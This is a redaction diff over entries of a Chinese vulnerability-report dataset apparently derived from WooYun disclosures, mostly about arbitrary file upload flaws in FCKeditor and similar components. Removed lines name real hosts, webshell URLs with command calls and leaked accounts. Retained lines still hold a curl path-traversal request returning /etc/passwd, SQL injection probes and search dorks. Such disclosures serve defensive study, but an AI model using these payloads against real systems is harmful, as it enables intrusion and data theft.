 **详情**: 任意文件上传导致代码执行。
 
-**POC**: 路径http://www.xjgrain.gov.cn:8080//system/resource/smalledit/upimage.jsp?actiontype=uploadprepic&dbName=vsb&ownerName=&owner=抓包修改扩展名，直接任意文件传入。界面shell截图木马地址是http://www.xjgrain.gov.cn:8080//_mediafile/contribute/imagefilepreview/2014/02/23/201402231d8jnr65vo.jsp
+**POC**: 路径https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11796,9 +11796,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看乌云的上一个仁兄WooYun: 改图网某个分域名存在任意文件上传漏洞可导致主站沦陷的 应该不是一个  因为我这是2个。(ˇˍˇ）ok 直接说主题：漏洞是上传：这2个点不在一个服务器上  所以 和楼上仁兄的不是一个洞。http://help.gaitu.com/FCKeditor/editor/fckeditor.htmlhttp://mana.gaitu.com/fckeditor/editor/fckeditor.html注意  不是一个服务器  而且  不是一个手法  只是列出了都有漏洞ok http://help.gaitu.com/ 的上传 拿下权限：注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是
+**详情**: 看乌云的上一个仁兄WooYun: 改图网某个分域名存在任意文件上传漏洞可导致主站沦陷的 应该不是一个  因为我这是2个。(ˇˍˇ）ok 直接说主题：漏洞是上传：这2个点不在一个服务器上  所以 和楼上仁兄的不是一个洞。https://example.com/[已脱敏]  不是一个服务器  而且  不是一个手法  只是列出了都有漏洞ok https://example.com/[已脱敏] 的上传 拿下权限：注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是
 
-**POC**: 注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是后台在哪？继续翻远程连接？  ok  ip反查   查到了  mana.gaitu.com 改图网后台登录页面ok 破解登陆：各种权限：服务器权限一样大：ok  115.238.101.214   219.139.240.190  测试完毕。  先到这里吧
+**POC**: 注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是后台在哪？继续翻远程连接？  ok  ip反查   查到了  mana.gaitu.com 改图网后台登录页面ok 破解登陆：各种权限：服务器权限一样大：ok  [IP已脱敏]   [IP已脱敏]  测试完毕。  先到这里吧
 
 **绕过**: 直接利用
 
@@ -11818,7 +11818,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 早晨刚上QQ，就有提示信箱收到个邮件，推广代码的，看了下主站，SKCMS，不熟悉啊，于是官方下了份，发现存在上传漏洞~~
+**详情**: 早晨刚上某互联网公司，就有提示信箱收到个邮件，推广代码的，看了下主站，SKCMS，不熟悉啊，于是官方下了份，发现存在上传漏洞~~
 
 **POC**: 上传页面上传个文件看看看看传到哪去了检验下成果做好上传权限和过滤吧~
 
@@ -11840,9 +11840,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tumen.gov.cn//upfile_photo.asphttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/test.html3个漏洞 http://www.tumen.gov.cn/news.asp?id=1202还有注人点
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏]
 
-**POC**: http://www.tumen.gov.cn//upfile_photo.asphttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/test.html
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11862,7 +11862,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://202.104.30.126/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=.com/是用友NC-IUFO报表系统
+**详情**: http://[IP已脱敏]
 
 **POC**: 详细漏洞利用可以看：WooYun: 用友NC-IUFO报表系统部分安全问题（影响多个大客户）这里跑出了部分：(LIGUIHUA)(LIUXY27)(NANJP)(YANMIAO)(ZHONGTR1)(huanghj2)(huangzy)(liusj)(lym)(mdvzhanglei)(qiufz1)(rainbow)(shenxy)(tuhongtao)(ufida)(ufida2)(ufida3)(yuanhh)(zhangjun)(zhangjun6)(zhanglei)(zhangxp)(zhongtr1)密码统一是123456可能是网站出现问题，并不能登陆进去。但也泄漏了内网的用户信
 
@@ -11884,7 +11884,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cjgov.iflytek.com 讯飞电子采购系统http://cjgov.iflytek.com/ftb.imagegallery.aspx  编辑器漏洞  上传图片一句话，利用iis解析漏洞使用菜刀连一下可以，然后上次个spy.aspx 好分析不说了 都是泪，又是系统权限。。。能否不逗，认真对待？
+**详情**: https://example.com/[已脱敏] 讯飞电子采购系统https://example.com/[已脱敏]  编辑器漏洞  上传图片一句话，利用iis解析漏洞使用菜刀连一下可以，然后上次个spy.aspx 好分析不说了 都是泪，又是系统权限。。。能否不逗，认真对待？
 
 **POC**: 见详细说明。
 
@@ -11928,7 +11928,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 教务管理地址http://218.199.176.2无验证马页面http://218.199.176.2/(rhkakirymynkt0vmrhdlzyqb)/default2.aspxhttp://218.199.176.2/(4333zb55spriyp45jbnmoaza)/default3.aspxhttp://218.199.176.2/(4333zb55spriyp45jbnmoaza)/default4.aspx上传漏洞http://218.199.176.2/fckeditor/editor/filemanager/browser/default/browser.html无验证马页面可以直接用burp爆破截取登陆突然不知道怎么了图片上传的好慢  口述一下吧再用sniper 改下下面这段post、POST /(rhkakirymynkt0vmrhdlzyqb)/default
+**详情**: 教务管理地址http://[IP已脱敏]无验证马页面http://[IP已脱敏]  口述一下吧再用sniper 改下下面这段post、POST /(rhkakirymynkt0vmrhdlzyqb)/default
 
 **POC**: 部门处长的好求个号学习一下555
 
@@ -11950,9 +11950,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://3gfs.net/order.php?id=192&type=zdq&num=1&tc=48&mstr=detail&mark=&shid=传马好像会被拦，于是，绕之：http://3gfs.net/img/id_pic/20150630164320.php?a=assert&b=phpinfo%28%29;列目录：http://3gfs.net/img/id_pic/20150630164320.php?a=system&b=dir由于功力太浅，未深入
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
-**POC**: 大量公民身份证信息：http://3gfs.net/img/id_pic/20150501203200.jpghttp://3gfs.net/img/id_pic/20150502192948.jpghttp://3gfs.net/img/id_pic/20150502231709.jpghttp://3gfs.net/img/id_pic/20150502232004.jpghttp://3gfs.net/img/id_pic/20150503071655.jpghttp://3gfs.net/img/id_pic/20150503144324.jpghttp://3gfs.net/img/
+**POC**: 大量公民身份证信息：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11972,7 +11972,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 好多敏感的东西 可用于渗透主站 而主站可以充各种点卡 甚至给支付宝充钱...url:http://f-roadpay.com.cn/froadpay/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector很低级的漏洞。。。
+**详情**: 好多敏感的东西 可用于渗透主站 而主站可以充各种点卡 甚至给某电商平台充钱...url:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -11994,7 +11994,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题在http://www.shandong.gov.cn/col/col4789/index.html这里 给省长写信  到了写信页面 打开开发者工具  能上传的附件类型在前端可以修改！改为jsp的然后提交 获取信件编号和密码去查看信件 点击附件链接 拼接出上传地址
+**详情**: 问题在https://example.com/[已脱敏] 给省长写信  到了写信页面 打开开发者工具  能上传的附件类型在前端可以修改！改为jsp的然后提交 获取信件编号和密码去查看信件 点击附件链接 拼接出上传地址
 
 **POC**: 传上去的shell后台  不深入了
 
@@ -12016,7 +12016,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 泄漏地址:https://ku6data.sdo.com存在目录历遍 下面看图不说话任意文件上传地址:https://ku6data.sdo.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/直接拖拽 好厉害
+**详情**: 泄漏地址:https://example.com/[已脱敏] 下面看图不说话任意文件上传地址:https://example.com/[已脱敏] 好厉害
 
 **POC**: 如上 稍微帖一点 很多文件比较大
 
@@ -12038,7 +12038,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:EduPlate/XBYXApp/http://www.mlzx.net/EduPlate/XBYXApp/Web/ftb.insertFile.aspxhttp://www.psshn2c.pudong-edu.sh.cn/EduPlate/xbyxapp/ftb.insertFile.aspxhttp://www.jcsy.pudong-edu.sh.cn/EduPlate/XBYXApp/ftb.insertFile.aspxhttp://zpxx.nh.edu.sh.cn/eduplate/XBYXApp//ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/XBYXApp/ftb.insertFile.aspx
+**详情**: inurl:EduPlate/XBYXApp/https://example.com/[已脱敏]
 
 **POC**: 就拿一个来举例子，上传任意文件。
 
@@ -12060,7 +12060,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 其实也就个小漏洞啦。直接爆菊花http://www.ihornet.cn/editor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media
+**详情**: 其实也就个小漏洞啦。直接爆菊花https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12082,13 +12082,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 深圳市商科网络科技有限公司【http://www.intersk.com/】，是一家致力于品牌网站建设，优化推广，400电话，企业邮箱、网站应用程序开发（B/S）等互联网领先服务商。简单的来说该公司开发的一套系统虽然没有什么名字这里就以“深圳互联系统”来命名，该系统主要用于深圳市各大企业公司网站的建设，该系统存在注射漏洞和未授权的任意文件上次漏洞，可能造成极大的危害，如何识别为深圳互联系统，我们看看后台的风格：输入admin可到下面后台：官网成功案例：该系统的url特征比较普遍，所以构造关键字比较难："网站制作：商科网络"inurl:“products.asp?classid” intitle:深圳第二个关键字搜索的大多是深圳互联系统，部分非互联系统，更好认证为该系统的方法只要在域名后加上：/admin。则会跳转到后台，如果后台页面风格与上面所提到的一样则可断定为深圳互联系统
+**详情**: 深圳市商科网络科技有限公司【https://example.com/[已脱敏]"网站制作：商科网络"inurl:“products.asp?classid” intitle:深圳第二个关键字搜索的大多是深圳互联系统，部分非互联系统，更好认证为该系统的方法只要在域名后加上：/admin。则会跳转到后台，如果后台页面风格与上面所提到的一样则可断定为深圳互联系统
 
 **POC**: 【警告：以下所提到的漏洞杀伤力极强，仅供CNVD测试与漏洞报告，其它人不得用此漏洞进行恶意破坏或利用，否则后果自负！】一、SQL注射漏洞：注射漏洞1：/productlist.asp?ID=  注入参数ID <部分没有该页面>注射漏洞2：/admin/Employee/Login.asp <登录框Post注射，通杀注射>*********************************************************************************************SQL注射一、证明【该系统部分装有安全狗】：测试跑跑吧：******************
 
 **绕过**: 直接利用
 
-**修复**: 不多说了，注射漏洞有一些装了安全狗，建议CNVD测试的时候官网有案例，以上均不深入咯！其次说一下通报漏洞的联系方式：官网：http://www.intersk.com/技术支持邮箱：support@intersk.com  投诉建议邮箱：feedback@intersk.com热线：+86-755-
+**修复**: 不多说了，注射漏洞有一些装了安全狗，建议CNVD测试的时候官网有案例，以上均不深入咯！其次说一下通报漏洞的联系方式：官网：https://example.com/[已脱敏]  投诉建议邮箱：feedback@intersk.com热线：+86-755-
 ---
 
 ---
@@ -12126,9 +12126,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 李锦记健康产品集团某站存在任意文件上传。地址：http://booking.lkkhpg.com//defaultroot/login.jsp上传地址：http://booking.lkkhpg.com///defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
+**详情**: 李锦记健康产品集团某站存在任意文件上传。地址：https://example.com/[已脱敏]
 
-**POC**: shell：http://booking.lkkhpg.com/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015121519185721255543434.jsp
+**POC**: shell：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12170,7 +12170,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传页面:http://mail.scihc.net/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php案例如下:http://mail.cdzk.org:8888/editor/filemanager/connectors/php/upload.phphttp://mail.scihc.net/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.phphttp://mail.ziyang.gov.cn/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/up
+**详情**: 上传页面:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12192,9 +12192,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 改图网后台管理处使用了FCKeditor编辑器，但是FCKeditor编辑器未能正确配置，导致任意文件上传。上穿文件地址：http://mana.gaitu.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html上穿aspx 马后，发现没有限制目录，在D:\SITE\Core\ 发现了网站的程序备份。分析了WWW下主站的程序，发现目录下有个 connn.aspx 程序可疑。因为.net程序 配置文件在web.config ，进一步发现 connn.aspx 是一个 aspxspy后门。进入主站一试，后门存在：http://www.gaitu.com/connn.aspx解出MD5密码，成功进入主站看了主站 www下的web.config 发现，原来数据库在
+**详情**: 改图网后台管理处使用了FCKeditor编辑器，但是FCKeditor编辑器未能正确配置，导致任意文件上传。上穿文件地址：https://example.com/[已脱敏] 马后，发现没有限制目录，在D:\SITE\Core\ 发现了网站的程序备份。分析了WWW下主站的程序，发现目录下有个 connn.aspx 程序可疑。因为.net程序 配置文件在web.config ，进一步发现 connn.aspx 是一个 aspxspy后门。进入主站一试，后门存在：https://example.com/[已脱敏] www下的web.config 发现，原来数据库在
 
-**POC**: http://www.gaitu.com/connn.aspx本人声明：未破坏任何数据！
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12214,9 +12214,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厂商：	 哈尔滨新中新电子股份有限公司谷歌搜索：http://music.google.cn/search?q=inurl:managerOneGgxxfb.action&newwindow=1&site=webhp&ei=u5ERVI_ULJfm8AX8v4CQDQ&start=40&sa=N （关键字可能不大准确..）实例：http://ecard.sjtu.edu.cn/homeLogin.action  上海交通大学http://ecard.sdu.edu.cn/homeLogin.action 山东大学http://ecard.utsz.edu.cn/homeLogin.action 深圳大学http://card.tjfsu.edu.cn/homeLogin.action 天津外国语大学http://ecard.tust.edu.cn/homeLogin.action 天津科技
+**详情**: 厂商：	 哈尔滨新中新电子股份有限公司谷歌搜索：https://example.com/[已脱敏] （关键字可能不大准确..）实例：https://example.com/[已脱敏]  上海交通大学https://example.com/[已脱敏] 山东大学https://example.com/[已脱敏] 深圳大学https://example.com/[已脱敏] 天津外国语大学https://example.com/[已脱敏] 天津科技
 
-**POC**: http://kwzx.hbue.edu.cn/homeLogin.action 湖北经济学院为例：http://kwzx.hbue.edu.cn/pages/xxfb/editor/uploadAction.action  文件上传处没有上传文件的按钮，可自己审查元素添加： <input type="submit" value="upload">http://kwzx.hbue.edu.cn/noticespic/moo20143711203700.jsp 密码：wooyunhttp://card.dgpt.edu.cn/pages/xxfb/editor/uploadAction.acti
+**POC**: https://example.com/[已脱敏] 湖北经济学院为例：https://example.com/[已脱敏]  文件上传处没有上传文件的按钮，可自己审查元素添加： <input type="submit" value="upload">https://example.com/[已脱敏] 密码：wooyunhttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12236,9 +12236,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 之前在 CNVD 提交另一处漏洞，今儿借助该平台提交另一处问题吧。影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------百度、谷歌 dork:  inurl:/ycportal--------------------------------------------------------问题一：任意目录遍历漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/说明：参数jumpPage为页数，如果一页不能显示全部文件，可修改该参数值，url为路径。问题二：文件上传导致任意代码执行漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/uploadfile.jsp?blocki
+**详情**: 之前在 CNVD 提交另一处漏洞，今儿借助该平台提交另一处问题吧。影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------某搜索引擎、谷歌 dork:  inurl:/ycportal--------------------------------------------------------问题一：任意目录遍历漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/说明：参数jumpPage为页数，如果一页不能显示全部文件，可修改该参数值，url为路径。问题二：文件上传导致任意代码执行漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/uploadfile.jsp?blocki
 
-**POC**: 问题一：任意目录遍历漏洞http://www.yqycgs.com.cn/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/http://www.dtycgs.cn:9080/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/http://www.sxlfyc.com/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/其他的就不截图了……http://ycycgs.com.cn/ycportal/js/wbTextBox/showimg.jsp?
+**POC**: 问题一：任意目录遍历漏洞https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12258,7 +12258,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厦门理工3个网站http://210.34.213.107/default2.aspxhttp://210.34.213.105/default2.aspxhttp://210.34.213.88/default2.aspx都是的http://210.34.213.107//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspxhttp://210.34.213.88//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspxhttp://210.34.213.105//fckedit
+**详情**: 厦门理工3个网站http://[IP已脱敏]
 
 **POC**: ``````````````````````
 
@@ -12280,9 +12280,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 全部采用用友ICC客服系统,上线前没有做严格测试!导致漏洞产生!全部可以获得管理权限!网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商中国电信中国联通安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网网易163零售卖场苏宁电器漏洞出现在：5107\upload\uploadfilesave.php 内<?php/*** uploadfilesave.php* 访客端文件上传.*/require_once('../global.inc.php');/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$des
+**详情**: 全部采用用友ICC客服系统,上线前没有做严格测试!导致漏洞产生!全部可以获得管理权限!网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商某运营商某运营商安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网某互联网公司163零售卖场苏宁电器漏洞出现在：5107\upload\uploadfilesave.php 内<?php/*** uploadfilesave.php* 访客端文件上传.*/require_once('../global.inc.php');/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$des
 
-**POC**: 前几天乌云有人提交迅雷http://icc.xunlei.com/5107/chat/chat.php 就这个问题导致。。。传张图吧
+**POC**: 前几天乌云有人提交迅雷https://example.com/[已脱敏] 就这个问题导致。。。传张图吧
 
 **绕过**: 直接利用
 
@@ -12302,9 +12302,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件上传成功后返回的下载地址：file参数指定一个不存在文件时会报绝对路径使用..%2F可以绕过../限制curl 'http://test2.53kf.com/new/client.php?m=download&a=downloadFile&file=..%2F/../../../../../../../../../../etc/passwd'root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:sh
+**详情**: 文件上传成功后返回的下载地址：file参数指定一个不存在文件时会报绝对路径使用..%2F可以绕过../限制curl 'https://example.com/[已脱敏]'root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:sh
 
-**POC**: 53KF官方：http://test2.53kf.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.php其它很多（inurl:new/client.php?arg=）：http://53kf2.meizu.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.php（我大魅族再次中枪了 唉！）http://csuser.jia.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.
+**POC**: 53KF官方：https://example.com/[已脱敏] 唉！）https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -12326,7 +12326,7 @@
 
 **详情**: 亚风速递某分站上传漏洞导致主站沦陷，主站成马场，各种黑帽的推广
 
-**POC**: http://oa.airfex.net/upfile.asp很简单的上传漏洞主站成了马厂还有黑帽的SEO主站有各种SQL注入漏洞http://www.airfex.net/cn_asp/news_show.asp?id=1092 and 1=1 正常页http://www.airfex.net/cn_asp/news_show.asp?id=1092 and 1=2 错误页主站还有 IIS写入WebDAV 漏洞主站后台地址：http://www.airfex.net/ruanji_2008/login.asp
+**POC**: https://example.com/[已脱敏] and 1=1 正常页https://example.com/[已脱敏] and 1=2 错误页主站还有 IIS写入WebDAV 漏洞主站后台地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12370,7 +12370,7 @@
 
 **详情**: 
 
-**POC**: http://www.ahaqly.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接进入eWebEditor
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12390,9 +12390,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 以下网站客服系统全部采用用友ICC客服系统网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商中国电信中国联通安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网网易163零售卖场苏宁电器小米科技该程序的/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php文件存在严重的逻辑错误!导致漏洞产生!以上大型网站的客服系统全部可以通过此漏洞获取管理权限!<?php/*** uploadFlash.php* Flash文件上传.*/require_once('../global.inc.php
+**详情**: 以下网站客服系统全部采用用友ICC客服系统网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商某运营商某运营商安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网某互联网公司163零售卖场苏宁电器小米科技该程序的/home/ecccs/web/5107https://example.com/[已脱敏] uploadFlash.php* Flash文件上传.*/require_once('../global.inc.php
 
-**POC**: 随便例举几个存在的https://95516.unionpay.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php   银联http://icc.xunlei.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php        迅雷http://app6.cpic.com.cn/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload
+**POC**: 随便例举几个存在的https://example.com/[已脱敏]   银联https://example.com/[已脱敏]        迅雷https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12412,7 +12412,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此漏洞在http://byz2010.caa.edu.cn/bbs/ 发现  登录账号后 发表新主题 添加附件 可以添加 asp;jpg格式文件
+**详情**: 此漏洞在https://example.com/[已脱敏] 发现  登录账号后 发表新主题 添加附件 可以添加 asp;jpg格式文件
 
 **POC**: (见原文)
 
@@ -12436,7 +12436,7 @@
 
 **详情**: 关键词：inurl:/sm2005上传漏洞，威胁挺大的。
 
-**POC**: 相关案例：http://www.dlwsxx.com//SM2005/public/AspUpload/index.htmlhttp://www.hwsyxx.com/SM2005/public/AspUpload/index.htmlhttp://www.suyaxing.com:81/SM2005/public/AspUpload/index.htmlhttp://www.lcxyz.com:21245/SM2005/public/AspUpload/index.htmlhttp://www.zjnksyzx.com:8801/SM2005/public/AspUpload/index.h
+**POC**: 相关案例：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12458,7 +12458,7 @@
 
 **详情**: 万和证券旗下产品“财易通”手机证券下载站点存在struts漏洞，可被脱裤
 
-**POC**: 漏洞地址：http://wap.vanho.cn/index.action良好公民，安全检测，绝不脱裤，尽快修复
+**POC**: 漏洞地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12478,9 +12478,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题很多。。 跨站什么的就不发了http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://ris.ccb.com/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp
+**详情**: 问题很多。。 跨站什么的就不发了https://example.com/[已脱敏]
 
-**POC**: http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://ris.ccb.com/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12502,7 +12502,7 @@
 
 **详情**: 焦作市行政处罚电子政务和电子监察系统struts漏洞导致其服务器沦陷
 
-**POC**: 网站地址：http://218.28.55.152/login.jsp考虑到此系统数据可能比较敏感，我直接没去碰数据库那块，添加个管理员直接远程桌面由于此系统的特殊性，本菜鸟只测试到这，不再继续深入。数据库碰都没敢碰，厂商尽快修复就是了。
+**POC**: 网站地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -12524,7 +12524,7 @@
 
 **详情**: 某p2p网贷系统 任意上传漏洞 涉及金钱交易数千万。。
 
-**POC**: google搜索 inurl:queryFrontAllDebt.do还有其他用户在使用该系统。http://www.yimincaifu.comhttp://116.255.138.208http://www.rjd.cchttp://www.crfp2p.comhttp://www.07363135555.comhttp://www.zrct.nethttp://www.letourong.com上传地址:http://www.winwindai.com/admin/uploadFileAction.do?obj=%7B%27fileType%27%3A%27JPG%2CJSP%2CGIF
+**POC**: google搜索 inurl:queryFrontAllDebt.do还有其他用户在使用该系统。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12546,7 +12546,7 @@
 
 **详情**: 先是上传，编辑器惹的祸，你懂的，然后是文件包含
 
-**POC**: 上传啊：POST /editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php HTTP/1.1Host: mail.schneider-electric.cnUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-L
+**POC**: 上传啊：POST /editor/filemanagerhttps://example.com/[已脱敏] HTTP/1.1Host: mail.schneider-electric.cnUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-L
 
 **绕过**: 直接利用
 
@@ -12554,7 +12554,7 @@
 ---
 
 ---
-### [wooyun-2013-031946] 中国移动400 某同类型后台在次沦陷
+### [wooyun-2013-031946] 某运营商400 某同类型后台在次沦陷
 **厂商**: 北京天润融通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
@@ -12566,7 +12566,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://baidusz.ti-net.cn/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media本地构造提交搞定！
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12588,7 +12588,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
